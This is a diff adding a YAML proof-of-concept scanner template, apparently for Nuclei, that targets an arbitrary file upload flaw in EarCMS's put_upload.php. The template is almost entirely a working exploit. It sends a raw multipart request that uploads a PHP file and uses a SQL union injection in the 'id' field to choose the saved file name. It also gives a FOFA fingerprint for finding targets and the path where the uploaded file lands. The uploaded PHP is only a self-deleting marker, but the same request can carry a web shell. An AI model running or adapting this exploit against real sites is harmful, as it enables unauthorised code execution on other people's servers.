@@ -1,0 +1,78 @@
+id: poc-ixsd630dbr6y0hmn
+info:
+  name: EarCMS put_upload.php 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ixsd630dbr6y0hmn'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ixsd630dbr6y0hmn
+    fofa: app="EearCMS"
+http:
+- raw:
+  - 'POST /source/index/put_upload.php HTTP/1.1
+
+
+    Content-Type: multipart/form-data;boundary=---------------------------51564987891651984798165156489
+
+
+
+
+    -----------------------------51564987891651984798165156489
+
+
+    Content-Disposition: form-data; name="ipa"; filename="dudesuite"
+
+
+    Content-Type: application/x-msdownload
+
+
+
+
+    <?php echo "dudesuite";unlink(__FILE__);?>
+
+
+    -----------------------------51564987891651984798165156489
+
+
+    Content-Disposition: form-data; name="id"
+
+
+
+
+    -1  union SELECT "dudesuite.php";
+
+
+    -----------------------------51564987891651984798165156489
+
+
+    Content-Disposition: form-data; name="pw"
+
+
+
+
+    month-cf3b79c6e54ca7a8d50cdc8aedcde407
+
+
+    -----------------------------51564987891651984798165156489--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /data/attachment/dudesuite.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
